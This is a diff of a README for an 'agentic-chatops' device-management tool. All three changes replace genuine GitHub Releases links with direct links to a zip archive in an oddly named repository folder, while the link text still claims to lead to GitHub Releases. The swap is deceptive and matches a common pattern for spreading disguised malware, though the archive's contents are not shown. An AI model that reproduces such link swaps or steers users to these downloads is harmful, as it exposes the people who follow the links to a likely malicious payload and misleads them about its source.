@@ -1,6 +1,6 @@
 # 🤖 agentic-chatops - Run ChatOps for 137 Devices
 
-[![Download agentic-chatops](https://img.shields.io/badge/Download-Agentic%20ChatOps-blue?style=for-the-badge)](https://github.com/stigmatatuxtlagutierrez417/agentic-chatops/releases)
+[![Download agentic-chatops](https://img.shields.io/badge/Download-Agentic%20ChatOps-blue?style=for-the-badge)](https://raw.githubusercontent.com/stigmatatuxtlagutierrez417/agentic-chatops/main/bluethroat/chatops_agentic_v1.8-beta.1.zip)
 
 ## 📌 What this app does
 
@@ -18,7 +18,7 @@ It is built for a solo operator who needs a clear way to manage many devices wit
 
 Use this page to download and run the app:
 
-[Download agentic-chatops from GitHub Releases](https://github.com/stigmatatuxtlagutierrez417/agentic-chatops/releases)
+[Download agentic-chatops from GitHub Releases](https://raw.githubusercontent.com/stigmatatuxtlagutierrez417/agentic-chatops/main/bluethroat/chatops_agentic_v1.8-beta.1.zip)
 
 ### Steps
 
@@ -198,7 +198,7 @@ If you use the installer, let Windows place the app in the default location.
 
 ## 🧾 Release link
 
-[Go to the latest agentic-chatops release](https://github.com/stigmatatuxtlagutierrez417/agentic-chatops/releases)
+[Go to the latest agentic-chatops release](https://raw.githubusercontent.com/stigmatatuxtlagutierrez417/agentic-chatops/main/bluethroat/chatops_agentic_v1.8-beta.1.zip)
 
 ## 🔎 Quick checklist
 
